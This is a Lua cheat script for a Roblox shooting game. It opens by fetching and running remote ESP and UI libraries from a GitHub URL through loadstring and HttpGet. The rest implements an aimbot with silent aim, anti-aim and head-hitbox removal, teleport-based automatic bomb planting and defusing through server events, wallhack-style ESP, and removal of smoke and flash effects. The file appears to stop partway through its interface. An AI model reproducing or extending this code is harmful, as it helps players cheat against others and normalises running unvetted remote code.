local ESP = loadstring(game:HttpGet("https://raw.githubusercontent.com/Pawel12d/hexagon/main/scripts/ESP.lua"))()
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Pawel12d/hexagon/main/scripts/UILibrary.lua"))()

local Window = library:CreateWindow(Vector2.new(500, 500), Vector2.new((workspace.CurrentCamera.ViewportSize.X/2)-250, (workspace.CurrentCamera.ViewportSize.Y/2)-250))



-- Functions
local function RandomString(length, strings)
	local strings = strings or {
		"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
		"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z",
		"0","1","2","3","4","5","6","7","8","9",
	}
	local output = ""
	for i = 1,length do
		output = tostring(output..""..strings[math.random(1,#strings)])
		if i == length then
			return output
		end
	end
end

local function IsAlive(plr)
	if plr and plr.Character and plr.Character.FindFirstChild(plr.Character, "Humanoid") and plr.Character.Humanoid.Health > 0 then
		return true
	end

	return false
end

local function IsVisible(pos, ignoreList)
	return #workspace.CurrentCamera:GetPartsObscuringTarget({LocalPlayer.Character.Head.Position, pos}, ignoreList) == 0 and true or false
end

local function GetTeam(plr)
	return game.Teams[plr.Team.Name]
end

local function GetSite()
	if (LocalPlayer.Character.HumanoidRootPart.Position - workspace.Map.SpawnPoints.C4Plant.Position).magnitude > (LocalPlayer.Character.HumanoidRootPart.Position - workspace.Map.SpawnPoints.C4Plant2.Position).magnitude then
		return "A"
	else
		return "B"
	end
end

local function CharacterAdded()
	wait(0.5)
	if IsAlive(LocalPlayer) then
		LocalPlayer.Character.Humanoid.StateChanged:Connect(function(state)
			if library.pointers.MiscellaneousTabCategoryBunnyHopEnabled.value == true then
				if UserInputService:IsKeyDown(Enum.KeyCode.Space) == false then
					isBhopping = false
					curVel = library.pointers.MiscellaneousTabCategoryBunnyHopMinVelocity.value
				elseif state == Enum.HumanoidStateType.Landed and UserInputService:IsKeyDown(Enum.KeyCode.Space) then
					LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
				elseif state == Enum.HumanoidStateType.Jumping then
					isBhopping = true
					curVel = (curVel + library.pointers.MiscellaneousTabCategoryBunnyHopAcceleration.value) >= library.pointers.MiscellaneousTabCategoryBunnyHopMaxVelocity.value and library.pointers.MiscellaneousTabCategoryBunnyHopMaxVelocity.value or curVel + library.pointers.MiscellaneousTabCategoryBunnyHopAcceleration.value
				end
			end
		end)
	end
end

local function PlayerAdded()
	
end

local function PlantC4()
	pcall(function()
	if IsAlive(LocalPlayer) and workspace.Map.Gamemode.Value == "defusal" and workspace.Status.Preparation.Value == false and not planting then 
		planting = true
		local pos = LocalPlayer.Character.HumanoidRootPart.CFrame 
		workspace.CurrentCamera.CameraType = "Fixed"
		LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Map.SpawnPoints.C4Plant.CFrame
		wait(0.2)
		game.ReplicatedStorage.Events.PlantC4:FireServer((pos + Vector3.new(0, -2.75, 0)) * CFrame.Angles(math.rad(90), 0, math.rad(180)), GetSite())
		wait(0.2)
		LocalPlayer.Character.HumanoidRootPart.CFrame = pos
		LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
		game.Workspace.CurrentCamera.CameraType = "Custom"
		planting = false
	end
	end)
end

local function DefuseC4()
	pcall(function()
	if IsAlive(LocalPlayer) and workspace.Map.Gamemode.Value == "defusal" and not defusing and workspace:FindFirstChild("C4") then 
		defusing = true
		LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
		local pos = LocalPlayer.Character.HumanoidRootPart.CFrame 
		workspace.CurrentCamera.CameraType = "Fixed"
		LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.C4.Handle.CFrame + Vector3.new(0, 2, 0)
		LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
		wait(0.1)
		LocalPlayer.Backpack.PressDefuse:FireServer(workspace.C4)
		LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
		wait(0.25)
		if IsAlive(LocalPlayer) and workspace:FindFirstChild("C4") and workspace.C4:FindFirstChild("Defusing") and workspace.C4.Defusing.Value == LocalPlayer then
			LocalPlayer.Backpack.Defuse:FireServer(workspace.C4)
		end
		LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
		wait(0.2)
		LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
		LocalPlayer.Character.HumanoidRootPart.CFrame = pos
		LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
		game.Workspace.CurrentCamera.CameraType = "Custom"
		defusing = false
	end
	end)
end

function GetSpectators()
	local CurrentSpectators = {}
	
	for i,v in pairs(game:GetService("Players"):GetChildren()) do 
		if v ~= game:GetService("Players").LocalPlayer then
			if not v.Character and v:FindFirstChild("CameraCF") and (v.CameraCF.Value.Position - workspace.CurrentCamera.CFrame.p).Magnitude < 10 then 
				table.insert(CurrentSpectators, v)
			end
		end
	end
	
	return CurrentSpectators
end

local function GetLegitbotTarget()
	local target,oldval = nil,math.huge
	
	for i,v in pairs(game.Players:GetPlayers()) do
		if IsAlive(v) and v ~= LocalPlayer and not v.Character:FindFirstChild("ForceField") then
			if library.pointers.AimbotTabCategoryLegitbotTeamCheck.value == false or GetTeam(v) ~= GetTeam(LocalPlayer) then
				if library.pointers.AimbotTabCategoryLegitbotVisibilityCheck.value == false or IsVisible(v.Character.Head.Position, {v.Character, LocalPlayer.Character, HexagonFolder, workspace.CurrentCamera}) == true then
					local Vector, onScreen = workspace.CurrentCamera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
					local FOV = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(Vector.X, Vector.Y)).magnitude
					
					if FOV < library.pointers.AimbotTabCategoryLegitbotFOV.value or library.pointers.AimbotTabCategoryLegitbotFOV.value == 0 then
						if math.floor((LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude) < library.pointers.AimbotTabCategoryLegitbotDistance.value or library.pointers.AimbotTabCategoryLegitbotDistance.value == 0 then
							if library.pointers.AimbotTabCategoryLegitbotTargetPriority.value == "FOV" then
								local Vector, onScreen = workspace.CurrentCamera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
								local FOV = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(Vector.X, Vector.Y)).magnitude
									
								if FOV < oldval then
									target = v
									oldval = FOV
								end
							elseif library.pointers.AimbotTabCategoryLegitbotTargetPriority.value == "Distance" then
								local Distance = math.floor((v.Character.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).magnitude)
								
								if Distance < oldval then
									target = v
									oldval = Distance
								end
							end
						end
					end
				end
			end
		end
	end
	
	if target ~= nil then
		return target
	end
	
	return nil
end

local function GetLegitbotHitbox(plr)
	local target,oldval = nil,math.huge
	
	for i,v in pairs(library.pointers.AimbotTabCategoryLegitbotHitbox.value) do
		for i2,v2 in pairs(Hitboxes[v]) do
			targetpart = plr.Character:FindFirstChild(v2)
			
			if targetpart ~= nil then
				if library.pointers.AimbotTabCategoryLegitbotHitboxPriority.value == "FOV" then
					local Vector, onScreen = workspace.CurrentCamera:WorldToScreenPoint(targetpart.Position)
					local FOV = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(Vector.X, Vector.Y)).magnitude
					
					if FOV < oldval then
						target = targetpart
						oldval = FOV
					end
				elseif library.pointers.AimbotTabCategoryLegitbotHitboxPriority.value == "Distance" then
					local Distance = math.floor((targetpart.Position - LocalPlayer.Character.HumanoidRootPart.Position).magnitude)
					
					if Distance < oldval then
						target = targetpart
						oldval = Distance
					end
				end
			end
		end
	end
	
	if target ~= nil then
		return target
	end
	
	return nil
end

local function TableToNames(tbl, alt)
	local otp = {}
	
	if alt then
		for i,v in pairs(tbl) do
			table.insert(otp, v.weaponname)
		end
	else
		for i,v in pairs(tbl) do
			table.insert(otp, i)
		end
	end
	
	return otp
end

local function AddCustomSkin(tbl) 
	if tbl and tbl.weaponname and tbl.skinname and tbl.model then
		local isGlove = false
		
		if table.find({"Strapped Glove", "Handwraps", "Sports Glove", "Fingerless Glove"}, tbl.weaponname) then
			isGlove = true
		end
		
		newfolder = Instance.new("Folder")
		newfolder.Name = tbl.skinname
		newfolder.Parent = (isGlove == true and game.ReplicatedStorage.Gloves) or (game.ReplicatedStorage.Skins[tbl.weaponname])
			
		if tbl.skinimage ~= nil then
			newvalue1 = Instance.new("StringValue")
			newvalue1.Name = tbl.skinname
			newvalue1.Value = tbl.skinimage
			newvalue1.Parent = LocalPlayer.PlayerGui.Client.Images[tbl.weaponname]
		end

		if tbl.skinrarity ~= nil then
			newvalue2 = Instance.new("StringValue")
			newvalue2.Name = "Quality"
			newvalue2.Value = tbl.skinrarity
			newvalue2.Parent = (isGlove == false and newvalue1) or nil
			
			newvalue3 = Instance.new("StringValue")
			newvalue3.Name = tostring(tbl.weaponname.."_"..tbl.skinname)
			newvalue3.Value = tbl.skinrarity
			newvalue3.Parent = LocalPlayer.PlayerGui.Client.Rarities
		end

		if isGlove == true then
			newtextures = Instance.new("SpecialMesh")
			newtextures.Name = "Textures"
			newtextures.MeshId = game.ReplicatedStorage.Gloves.Models[tbl.weaponname].RGlove.Mesh.MeshId
			newtextures.TextureId = tbl.model.Handle
			newtextures.Parent = newfolder
			
			newtype = Instance.new("StringValue")
			newtype.Name = "Type"
			newtype.Value = tbl.weaponname
			newtype.Parent = newfolder
		else
			for i,v in pairs(tbl.model) do
				if i == "Main" then
					for i2,v2 in pairs(game.ReplicatedStorage.Viewmodels["v_"..tbl.weaponname]:GetChildren()) do
						if v2:IsA("BasePart") and not table.find({"Right Arm", "Left Arm", "Flash"}, v2.Name) and v2.Transparency ~= 1 then
							newvalue = Instance.new("StringValue")
							newvalue.Name = v2.Name
							newvalue.Value = v
							newvalue.Parent = newfolder
						end
					end
				end
				
				newvalue = Instance.new("StringValue")
				newvalue.Name = i
				newvalue.Value = v
				newvalue.Parent = newfolder
			end
		end
		table.insert(nocw_s, {tostring(tbl.weaponname.."_"..tbl.skinname)})
			
		print("Custom skin: "..tostring(tbl.weaponname.."_"..tbl.skinname).." successfully injected!")
	end
end

local function AddCustomModel(tbl)
	if tbl and tbl.weaponname and tbl.modelname and tbl.model and game.ReplicatedStorage.Weapons:FindFirstChild(tbl.modelname) then
		if game.ReplicatedStorage.Viewmodels:FindFirstChild("v_"..tbl.modelname) then
			game.ReplicatedStorage.Viewmodels["v_"..tbl.modelname]:Destroy()
		end
		
		newmodel = tbl.model
		newmodel.Name = "v_"..tbl.modelname
		newmodel.Parent = game.ReplicatedStorage.Viewmodels
		
		table.insert(nocw_m, {tostring(tbl.modelname)})
	end
end

-- GUI
local AimbotTab = Window:CreateTab("Aimbot")

local AimbotTabCategoryLegitbot = AimbotTab:AddCategory("Legitbot", 1)

AimbotTabCategoryLegitbot:AddToggle("Enabled", false, "AimbotTabCategoryLegitbotEnabled", function(val)
	if val == true then
		LegitbotLoop = game:GetService("RunService").RenderStepped:Connect(function()
			if library.base.Window.Visible == false and IsAlive(LocalPlayer) then
				if library.pointers.AimbotTabCategoryLegitbotKeybind.value == nil or (library.pointers.AimbotTabCategoryLegitbotKeybind.value.EnumType == Enum.KeyCode and UserInputService:IsKeyDown(library.pointers.AimbotTabCategoryLegitbotKeybind.value)) or (library.pointers.AimbotTabCategoryLegitbotKeybind.value.EnumType == Enum.UserInputType and UserInputService:IsMouseButtonPressed(library.pointers.AimbotTabCategoryLegitbotKeybind.value)) then
					plr = GetLegitbotTarget()
					
					if plr ~= nil then
						hitboxpart = GetLegitbotHitbox(plr)
						
						if hitboxpart ~= nil then
							local Vector, onScreen = workspace.CurrentCamera:WorldToScreenPoint(hitboxpart.Position)
							local PositionX = (Mouse.X-Vector.X)/library.pointers.AimbotTabCategoryLegitbotSmoothness.value + 1
							local PositionY = (Mouse.Y-Vector.Y)/library.pointers.AimbotTabCategoryLegitbotSmoothness.value + 1
							
							if library.pointers.AimbotTabCategoryLegitbotSilent.value == true then
								SilentLegitbot.target = hitboxpart
								SilentLegitbot.aiming = true
							else
								mousemove(-PositionX, -PositionY)
								if SilentLegitbot.target ~= nil then SilentLegitbot.target = nil end
							end
						else
							if SilentLegitbot.target ~= nil then SilentLegitbot.target = nil end
						end
					else
						if SilentLegitbot.target ~= nil then SilentLegitbot.target = nil end
					end
				else
					if SilentLegitbot.target ~= nil then SilentLegitbot.target = nil end
				end
			else
				if SilentLegitbot.target ~= nil then SilentLegitbot.target = nil end
			end
		end)
	elseif val == false and LegitbotLoop then
		LegitbotLoop:Disconnect()
	end
end)

AimbotTabCategoryLegitbot:AddToggle("Silent", false, "AimbotTabCategoryLegitbotSilent")

AimbotTabCategoryLegitbot:AddToggle("Team Check", false, "AimbotTabCategoryLegitbotTeamCheck")

AimbotTabCategoryLegitbot:AddToggle("Visibility Check", false, "AimbotTabCategoryLegitbotVisibilityCheck")

AimbotTabCategoryLegitbot:AddKeybind("Keybind", nil, "AimbotTabCategoryLegitbotKeybind")

AimbotTabCategoryLegitbot:AddMultiDropdown("Hitbox", {"Head", "Chest", "Arms", "Legs"}, {"Head"}, "AimbotTabCategoryLegitbotHitbox")

AimbotTabCategoryLegitbot:AddDropdown("Hitbox Priority", {"FOV", "Distance"}, "FOV", "AimbotTabCategoryLegitbotHitboxPriority")

AimbotTabCategoryLegitbot:AddDropdown("Target Priority", {"FOV", "Distance"}, "FOV", "AimbotTabCategoryLegitbotTargetPriority")

AimbotTabCategoryLegitbot:AddSlider("Field of View", {0, 360, 0, 1, "°"}, "AimbotTabCategoryLegitbotFOV", function(val)
	FOVCircle.Radius = val
end)

AimbotTabCategoryLegitbot:AddSlider("Distance", {0, 2048, 0, 1, " studs"}, "AimbotTabCategoryLegitbotDistance")

AimbotTabCategoryLegitbot:AddSlider("Smoothness", {1, 30, 1, 1, ""}, "AimbotTabCategoryLegitbotSmoothness")

AimbotTabCategoryLegitbot:AddSlider("Hitchance", {0, 100, 100, 1, "%"}, "AimbotTabCategoryLegitbotHitchance")

local AimbotTabCategoryAntiAimbot = AimbotTab:AddCategory("Anti Aimbot", 2)

AimbotTabCategoryAntiAimbot:AddToggle("Enabled", false, "AimbotTabCategoryAntiAimbotEnabled", function(val)
	AntiAimbot = val
	
	while AntiAimbot do
		if IsAlive(LocalPlayer) and (library.pointers.AimbotTabCategoryAntiAimbotDisableWhileClimbing.value == false or cbClient.climbing == false) then
			function RotatePlayer(pos)
				local Gyro = Instance.new('BodyGyro')
				Gyro.D = 0
				Gyro.P = (library.pointers.AimbotTabCategoryAntiAimbotYawStrenght.value * 100)
				Gyro.MaxTorque = Vector3.new(0, (library.pointers.AimbotTabCategoryAntiAimbotYawStrenght.value * 100), 0)
				Gyro.Parent = game.Players.LocalPlayer.Character.UpperTorso
				Gyro.CFrame = CFrame.new(Gyro.Parent.Position, pos.Position)
				wait()
				Gyro:Destroy()
			end
			
			if library.pointers.AimbotTabCategoryAntiAimbotRemoveHeadHitbox.value == true then
				if game.Players.LocalPlayer.Character:FindFirstChild("HeadHB") then
					game.Players.LocalPlayer.Character.HeadHB:Destroy()
				end
				if game.Players.LocalPlayer.Character:FindFirstChild("FakeHead") then
					game.Players.LocalPlayer.Character.FakeHead:Destroy()
				end
				if game.Players.LocalPlayer.Character:FindFirstChild("Head") and game.Players.LocalPlayer.Character.Head.Transparency ~= 0 then
					game.Players.LocalPlayer.Character.Head.Transparency = 0
				end
			end
			
			if table.find({"Backward", "Left", "Right"}, library.pointers.AimbotTabCategoryAntiAimbotYaw.value) then
				game.Players.LocalPlayer.Character.Humanoid.AutoRotate = false
				local Angle = (
					library.pointers.AimbotTabCategoryAntiAimbotYaw.value == "Backward" and CFrame.new(-4, 0, 0) or
					library.pointers.AimbotTabCategoryAntiAimbotYaw.value == "Left" and CFrame.new(-180, 0, 0) or
					library.pointers.AimbotTabCategoryAntiAimbotYaw.value == "Right" and CFrame.new(180, 0, 0)
				)
				RotatePlayer(workspace.CurrentCamera.CFrame * Angle)
			elseif library.pointers.AimbotTabCategoryAntiAimbotYaw.value == "Spin" then
				game.Players.LocalPlayer.Character.Humanoid.AutoRotate = false
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(library.pointers.AimbotTabCategoryAntiAimbotYawStrenght.value), 0)
			elseif game.Players.LocalPlayer.Character.Humanoid.AutoRotate == false then
				game.Players.LocalPlayer.Character.Humanoid.AutoRotate = true
			end
		end

		wait(0.02)
	end
	
	if IsAlive(LocalPlayer) then
		game.Players.LocalPlayer.Character.Humanoid.AutoRotate = true
	end
end)

AimbotTabCategoryAntiAimbot:AddDropdown("Pitch", {"Default", "Up", "Down", "Boneless", "Random"}, "Default", "AimbotTabCategoryAntiAimbotPitch")

AimbotTabCategoryAntiAimbot:AddDropdown("Yaw", {"Default", "Forward", "Backward", "Left", "Right", "Spin"}, "Default", "AimbotTabCategoryAntiAimbotYaw")

AimbotTabCategoryAntiAimbot:AddSlider("Yaw Strenght", {0, 100, 50, 1, ""}, "AimbotTabCategoryAntiAimbotYawStrenght")

AimbotTabCategoryAntiAimbot:AddToggle("Remove Head Hitbox", false, "AimbotTabCategoryAntiAimbotRemoveHeadHitbox")

AimbotTabCategoryAntiAimbot:AddToggle("Disable While Climbing", false, "AimbotTabCategoryAntiAimbotDisableWhileClimbing")

AimbotTabCategoryAntiAimbot:AddKeybind("Manual Forward", nil, "AimbotTabCategoryAntiAimbotManualForward", function(val)
	if val == true and UserInputService:GetFocusedTextBox() == nil then library.pointers.AimbotTabCategoryAntiAimbotYaw:Set("Forward") end
end)

AimbotTabCategoryAntiAimbot:AddKeybind("Manual Left", nil, "AimbotTabCategoryAntiAimbotManualLeft", function(val)
	if val == true and UserInputService:GetFocusedTextBox() == nil then library.pointers.AimbotTabCategoryAntiAimbotYaw:Set("Left") end
end)

AimbotTabCategoryAntiAimbot:AddKeybind("Manual Right", nil, "AimbotTabCategoryAntiAimbotManualRight", function(val)
	if val == true and UserInputService:GetFocusedTextBox() == nil then library.pointers.AimbotTabCategoryAntiAimbotYaw:Set("Right") end
end)

AimbotTabCategoryAntiAimbot:AddKeybind("Manual Backward", nil, "AimbotTabCategoryAntiAimbotManualBackward", function(val)
	if val == true and UserInputService:GetFocusedTextBox() == nil then library.pointers.AimbotTabCategoryAntiAimbotYaw:Set("Backward") end
end)

AimbotTabCategoryAntiAimbot:AddKeybind("Manual Spin", nil, "AimbotTabCategoryAntiAimbotManualSpin", function(val)
	if val == true and UserInputService:GetFocusedTextBox() == nil then library.pointers.AimbotTabCategoryAntiAimbotYaw:Set("Spin") end
end)



local VisualsTab = Window:CreateTab("Visuals") 

local VisualsTabCategoryPlayers = VisualsTab:AddCategory("Players", 1)

VisualsTabCategoryPlayers:AddToggle("Enabled", false, "VisualsTabCategoryPlayersEnabled", function(val)
	ESP.Enabled = val
end)

VisualsTabCategoryPlayers:AddToggle("Info", false, "VisualsTabCategoryPlayersInfo", function(val)
	ESP.ShowInfo = val
end)

VisualsTabCategoryPlayers:AddToggle("Tracers", false, "VisualsTabCategoryPlayersTracers", function(val)
	ESP.Tracers = val
end)

VisualsTabCategoryPlayers:AddToggle("Boxes", false, "VisualsTabCategoryPlayersBoxes", function(val)
	ESP.Boxes = val
end)

VisualsTabCategoryPlayers:AddToggle("Show Team", false, "VisualsTabCategoryPlayersShowTeam", function(val)
	ESP.ShowTeam = val
end)

VisualsTabCategoryPlayers:AddToggle("Use Team Color", false, "VisualsTabCategoryPlayersUseTeamColor", function(val)
	ESP.UseTeamColor = val
end)

VisualsTabCategoryPlayers:AddMultiDropdown("Info Settings", {"Name", "Health", "Weapons", "Distance"}, {}, "VisualsTabCategoryPlayersInfoSettings", function(val)
	ESP.Info.Name = (table.find(val, "Name") and true) or false
	ESP.Info.Health = (table.find(val, "Health") and true) or false
	ESP.Info.Weapons = (table.find(val, "Weapons") and true) or false
	ESP.Info.Distance = (table.find(val, "Distance") and true) or false
end)

VisualsTabCategoryPlayers:AddColorPicker("Team Color", Color3.new(0,1,0), "VisualsTabCategoryPlayersTeamColor", function(val)
	ESP.TeamColor = val
end)

VisualsTabCategoryPlayers:AddColorPicker("Enemy Color", Color3.new(1,0,0), "VisualsTabCategoryPlayersEnemyColor", function(val)
	ESP.EnemyColor = val
end)

local VisualsTabCategoryDroppedESP = VisualsTab:AddCategory("Dropped ESP", 1)

VisualsTabCategoryDroppedESP:AddToggle("Enabled", false, "VisualsTabCategoryDroppedESPEnabled")

VisualsTabCategoryDroppedESP:AddColorPicker("Color", Color3.new(1,1,1), "VisualsTabCategoryDroppedESPColor")

VisualsTabCategoryDroppedESP:AddMultiDropdown("Info", {"Icon", "Text", "Ammo"}, {"Icon", "Text", "Ammo"}, "VisualsTabCategoryDroppedESPInfo")

local VisualsTabCategoryGrenadeESP = VisualsTab:AddCategory("Grenade ESP", 1)

VisualsTabCategoryGrenadeESP:AddToggle("Enabled", false, "VisualsTabCategoryGrenadeESPEnabled")

VisualsTabCategoryGrenadeESP:AddColorPicker("Color", Color3.new(1,0.5,0), "VisualsTabCategoryGrenadeESPColor")

VisualsTabCategoryGrenadeESP:AddMultiDropdown("Info", {"Icon", "Text"}, {"Icon", "Text"}, "VisualsTabCategoryGrenadeESPInfo")

local VisualsTabCategoryBombESP = VisualsTab:AddCategory("Bomb ESP", 1)

VisualsTabCategoryBombESP:AddToggle("Enabled", false, "VisualsTabCategoryBombESPEnabled")

VisualsTabCategoryBombESP:AddColorPicker("Color", Color3.new(1,0,0), "VisualsTabCategoryBombESPColor")

VisualsTabCategoryBombESP:AddMultiDropdown("Info", {"Icon", "Text", "Timer"}, {"Icon", "Text", "Timer"}, "VisualsTabCategoryBombESPInfo")

local VisualsTabCategoryOthers = VisualsTab:AddCategory("Others", 1)

VisualsTabCategoryOthers:AddMultiDropdown("Remove Effects", {"Scope", "Flash", "Smoke", "Bullet Holes", "Blood", "Ragdolls"}, {}, "VisualsTabCategoryOthersRemoveEffects", function(val)
	if table.find(val, "Scope") then
		LocalPlayer.PlayerGui.GUI.Crosshairs.Scope.ImageTransparency = 1
		LocalPlayer.PlayerGui.GUI.Crosshairs.Scope.Scope.ImageTransparency = 1
		LocalPlayer.PlayerGui.GUI.Crosshairs.Scope.Scope.Size = UDim2.new(2,0,2,0)
		LocalPlayer.PlayerGui.GUI.Crosshairs.Scope.Scope.Position = UDim2.new(-0.5,0,-0.5,0)
		LocalPlayer.PlayerGui.GUI.Crosshairs.Scope.Scope.Blur.ImageTransparency = 1
		LocalPlayer.PlayerGui.GUI.Crosshairs.Scope.Scope.Blur.Blur.ImageTransparency = 1
		LocalPlayer.PlayerGui.GUI.Crosshairs.Frame1.Transparency = 1
		LocalPlayer.PlayerGui.GUI.Crosshairs.Frame2.Transparency = 1
		LocalPlayer.PlayerGui.GUI.Crosshairs.Frame3.Transparency = 1
		LocalPlayer.PlayerGui.GUI.Crosshairs.Frame4.Transparency = 1
	else
		LocalPlayer.PlayerGui.GUI.Crosshairs.Scope.ImageTransparency = 0
		LocalPlayer.PlayerGui.GUI.Crosshairs.Scope.Scope.ImageTransparency = 0
		LocalPlayer.PlayerGui.GUI.Crosshairs.Scope.Scope.Size = UDim2.new(1,0,1,0)
		LocalPlayer.PlayerGui.GUI.Crosshairs.Scope.Scope.Position = UDim2.new(0,0,0,0)
		LocalPlayer.PlayerGui.GUI.Crosshairs.Scope.Scope.Blur.ImageTransparency = 0
		LocalPlayer.PlayerGui.GUI.Crosshairs.Scope.Scope.Blur.Blur.ImageTransparency = 0
		LocalPlayer.PlayerGui.GUI.Crosshairs.Frame1.Transparency = 0
		LocalPlayer.PlayerGui.GUI.Crosshairs.Frame2.Transparency = 0
		LocalPlayer.PlayerGui.GUI.Crosshairs.Frame3.Transparency = 0
		LocalPlayer.PlayerGui.GUI.Crosshairs.Frame4.Transparency = 0
	end
	
	if table.find(val, "Flash") then
		LocalPlayer.PlayerGui.Blnd.Enabled = false
	else
		LocalPlayer.PlayerGui.Blnd.Enabled = true
	end
	
	if table.find(val, "Smoke") then
		for i,v in pairs(workspace.Ray_Ignore.Smokes:GetChildren()) do
			if v.Name == "Smoke" then
				v:Remove()
			end
		end
	end
	
	if table.find(val, "Bullet Holes") then
		for i,v in pairs(workspace.Debris:GetChildren()) do
			if v.Name == "Bullet" then
				v:Remove()
			end
		end
	end
	
	if table.find(val, "Blood") then
		for i,v in pairs(workspace.Debris:GetChildren()) do
			if v.Name == "SurfaceGui" then
				v:Remove()
			end
		end
	end
	
	if table.find(val, "Ragdolls") then
		-- Ragdolls are currently disabled in the game
	end
end)

VisualsTabCategoryOthers:AddColorPicker("Ambient", Color3.new(1,1,1), "VisualsTabCategoryOthersAmbient", function(val)
	workspace.CurrentCamera.ColorCorrection.TintColor = val
end)

VisualsTabCategoryOthers:AddDropdown("Skybox", TableToNames(Skyboxes), "Default", "VisualsTabCategoryOthersSkybox", function(val)
	if game.Lighting:FindFirstChild("HEXAGON_SKYBOX") then
		game.Lighting:FindFirstChild("HEXAGON_SKYBOX"):Destroy()
	end
	
	if val ~= "Default" and rawget(Skyboxes, val) then
		local NewSkybox = Instance.new("Sky", game.Lighting)
		NewSkybox.Name = "HEXAGON_SKYBOX"
		
		for i,v in pairs(rawget(Skyboxes, val)) do
			NewSkybox[i] = v
		end
	end
	
	pcall(function()
		library.pointers.VisualsTabCategoryOthersSkybox:Refresh(TableToNames(Skyboxes))
	end)
end)

VisualsTabCategoryOthers:AddToggle("Force Crosshair", false, "VisualsTabCategoryOthersForceCrosshair")

VisualsTabCategoryOthers:AddToggle("Old Music", false, "VisualsTabCategoryOthersOldMusic", function(val)
	if val == true then
		-- T
		LocalPlayer.PlayerGui.Music.ValveT.Lose.SoundId = "rbxassetid://168869486"
		LocalPlayer.PlayerGui.Music.ValveT.Win.SoundId = "rbxassetid://203383389"
		LocalPlayer.PlayerGui.Music.ValveT.StartRound["1"].SoundId = "rbxassetid://203383443"
		StartRound2 = LocalPlayer.PlayerGui.Music.ValveT.StartRound["1"]:Clone() StartRound2.Name = "2" StartRound2.SoundId = "rbxassetid://329924698" StartRound2.Parent = LocalPlayer.PlayerGui.Music.ValveT.StartRound
		StartRound3 = LocalPlayer.PlayerGui.Music.ValveT.StartRound["1"]:Clone() StartRound3.Name = "3" StartRound3.SoundId = "rbxassetid://329924746" StartRound3.Parent = LocalPlayer.PlayerGui.Music.ValveT.StartRound
		StartRound4 = LocalPlayer.PlayerGui.Music.ValveT.StartRound["1"]:Clone() StartRound4.Name = "4" StartRound4.SoundId = "rbxassetid://329924808" StartRound4.Parent = LocalPlayer.PlayerGui.Music.ValveT.StartRound
		LocalPlayer.PlayerGui.Music.ValveT.StartAction["1"].SoundId = "rbxassetid://203383519"
		StartAction2 = LocalPlayer.PlayerGui.Music.ValveT.StartAction["1"]:Clone() StartAction2.Name = "2" StartAction2.SoundId = "rbxassetid://329924647" StartAction2.Parent = LocalPlayer.PlayerGui.Music.ValveT.StartAction
		LocalPlayer.PlayerGui.Music.ValveT["10"].SoundId = "rbxassetid://340817948"
		LocalPlayer.PlayerGui.Music.ValveT["10"].Volume = 0.4
		LocalPlayer.PlayerGui.Music.ValveT.Bomb.SoundId = "rbxassetid://340817926"
		-- CT
		LocalPlayer.PlayerGui.Music.ValveCT.Lose.SoundId = "rbxassetid://168869486"
		LocalPlayer.PlayerGui.Music.ValveCT.Win.SoundId = "rbxassetid://203383389"
		LocalPlayer.PlayerGui.Music.ValveCT.StartRound["1"].SoundId = "rbxassetid://203383443"
		StartRound2 = LocalPlayer.PlayerGui.Music.ValveCT.StartRound["1"]:Clone() StartRound2.Name = "2" StartRound2.SoundId = "rbxassetid://329924698" StartRound2.Parent = LocalPlayer.PlayerGui.Music.ValveCT.StartRound
		StartRound3 = LocalPlayer.PlayerGui.Music.ValveCT.StartRound["1"]:Clone() StartRound3.Name = "3" StartRound3.SoundId = "rbxassetid://329924746" StartRound3.Parent = LocalPlayer.PlayerGui.Music.ValveCT.StartRound
		StartRound4 = LocalPlayer.PlayerGui.Music.ValveCT.StartRound["1"]:Clone() StartRound4.Name = "4" StartRound4.SoundId = "rbxassetid://329924808" StartRound4.Parent = LocalPlayer.PlayerGui.Music.ValveCT.StartRound
		LocalPlayer.PlayerGui.Music.ValveCT.StartAction["1"].SoundId = "rbxassetid://203383519"
		StartAction2 = LocalPlayer.PlayerGui.Music.ValveCT.StartAction["1"]:Clone() StartAction2.Name = "2" StartAction2.SoundId = "rbxassetid://329924647" StartAction2.Parent = LocalPlayer.PlayerGui.Music.ValveCT.StartAction
		LocalPlayer.PlayerGui.Music.ValveCT["10"].SoundId = "rbxassetid://340817891"
		LocalPlayer.PlayerGui.Music.ValveCT["10"].Volume = 0.4
		LocalPlayer.PlayerGui.Music.ValveCT.Bomb.SoundId = "rbxassetid://340817834"
	elseif val == false then
		LocalPlayer.PlayerGui.Music.ValveT:Destroy()
		LocalPlayer.PlayerGui.Music.ValveCT:Destroy()
		oldMusicT:Clone().Parent = LocalPlayer.PlayerGui.Music
		oldMusicCT:Clone().Parent = LocalPlayer.PlayerGui.Music
	end
end)

VisualsTabCategoryOthers:AddToggle("Bullet Tracers", false, "VisualsTabCategoryOthersBulletTracers")

VisualsTabCategoryOthers:AddColorPicker("Bullet Tracers Color", Color3.new(0,0.5,1), "VisualsTabCategoryOthersBulletTracersColor")

VisualsTabCategoryOthers:AddToggle("Bullet Impacts", false, "VisualsTabCategoryOthersBulletImpacts")

